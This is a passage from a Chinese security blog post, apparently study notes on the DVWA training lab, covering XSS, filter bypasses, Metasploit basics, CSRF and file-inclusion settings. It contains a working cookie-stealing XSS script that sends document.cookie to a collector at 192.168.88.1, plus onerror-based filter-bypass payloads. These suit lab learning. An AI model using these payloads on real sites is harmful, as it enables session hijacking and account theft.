class="line">    </span><br><span class="line">窃取cookie，write里面时三部分拼接在一起</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.<span class="title function_ invoke__">write</span>(</span><br><span class="line">    	<span class="string">&#x27;&lt;img src=&quot;http://192.168.88.1/getcookie.php?cookie=&#x27;</span> + </span><br><span class="line">    	document.cookie + </span><br><span class="line">    	<span class="string">&#x27;&quot; width=0 height=0 border=0 /&gt;&#x27;</span></span><br><span class="line">	);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">firebug扩展可以改cookie不过已经停止维护了</span><br></pre></td></tr></table></figure>

<h2 id="突破过滤"><a href="#突破过滤" class="headerlink" title="突破过滤"></a>突破过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;script&gt;过滤</span><br><span class="line">用&lt;img&gt;或者双写script</span><br><span class="line">2.alert过滤</span><br><span class="line">用	&lt;script&gt;confirm(&#x27;hi&#x27;)&lt;/script&gt;</span><br><span class="line">	&lt;img src=1 onerror=confirm(&#x27;1&#x27;)&gt;</span><br><span class="line">3.XSS语句输出标签属性中突破</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.对前端输入和输出过滤编码</span></span><br><span class="line">htmlspecialchars、strip_tags</span><br><span class="line"><span class="comment">//2.关键cookie只用host-only</span></span><br></pre></td></tr></table></figure>

<h1 id="Metasploit-系统漏洞"><a href="#Metasploit-系统漏洞" class="headerlink" title="Metasploit(系统漏洞)"></a>Metasploit(系统漏洞)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Metasploit Framework(MSF)集成了各个平台上常见的溢出漏洞和利用代码</span><br><span class="line">sectools排第二</span><br></pre></td></tr></table></figure>

<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果能够成功地对目标计算机进行缓冲区溢出，那么就可以直接获得系统shell</span><br><span class="line">要成功进行缓冲区溢出，前提是目标计算机存在漏洞</span><br><span class="line">微软对Windows系统的漏洞MS08_067		MS表示Windows2008年第67个漏洞</span><br></pre></td></tr></table></figure>

<h2 id="kali上使用"><a href="#kali上使用" class="headerlink" title="kali上使用"></a>kali上使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">具体看https://www.bilibili.com/video/BV1Di4y1u7s6?p=16&amp;vd_source=d5448e640adeda715972607248810967</span><br><span class="line">没看完</span><br><span class="line"></span><br><span class="line">自带,PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS）</span><br><span class="line">service postgresql start		首先打开数据库</span><br><span class="line">msfconsole						打开msf，windows也是这句</span><br><span class="line">包含模块：	一般先使用渗透攻击模块exploit对目标进行渗透，渗透成功后执行攻击荷载模块</span><br><span class="line">exploit		渗透攻击模块，用于实际发起攻击</span><br><span class="line">auxiliary	辅助模块，执行扫描之类的动作</span><br><span class="line">payload		攻击荷载模块，目标被成功渗透后执行的代码，payload中主要内容包括shellcode，一段获取shell的代码</span><br><span class="line"></span><br><span class="line">MS14_064漏洞</span><br><span class="line">远程攻击者可利用此漏洞通过构造的网站执行任意代码</span><br><span class="line">影响Win95+IE3~Win10+IE11全版本</span><br><span class="line">Metasploit中此漏洞的利用模块是exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">此exploit需要调用powershell，因而支队安装有powershell的系统有效</span><br></pre></td></tr></table></figure>

<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CSRF(Cross-Site Request Forgery)跨站点请求伪造</span><br><span class="line">特点：盗用用户的身份，以用户的名义进行某些非法操作 </span><br></pre></td></tr></table></figure>

<h2 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//medium</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]			<span class="comment">//用户提交的http协议的referer信息来源地址，</span></span><br><span class="line"><span class="comment">//bp可以改referer，有些机构禁用了referer</span></span><br><span class="line"></span><br><span class="line">同级目录下D:\phpStudy\WWW\dvwa\vulnerabilities\fi\index.php</span><br><span class="line">    </span><br><span class="line"><span class="comment">//	medium级别转义删除http:// https://	防止远程文件包含</span></span><br><span class="line"><span class="comment">//	远程包含漏洞前提，php.ini配置如下：</span></span><br><span class="line">    allow_url_fopen=on</span><br><span class="line">    allow_url_include=on</span><br><span class="line">    magic_quotes_gpc=off</span><br></pre></td></tr></table></figure>




                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Hyy</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://huyaoyao2019.github.io/2023/07/06/dvwa/">http://huyaoyao2019.github.io/2023/07/06/dvwa/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Hyy</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/web%E9%9D%B6%E5%9C%BA/">
                                    <span class="chip bg-color">web靶场</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">您的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/07/10/%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="使用的工具">
                        
                        <span class="card-title">使用的工具</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-10
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            hyy
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="b站小迪2020">
                        
                        <span class="card-title">b站小迪2020</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-05
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            hyy
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">Hyy</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/huyaoyao2019" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1228876399@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1228876399" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1228876399" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
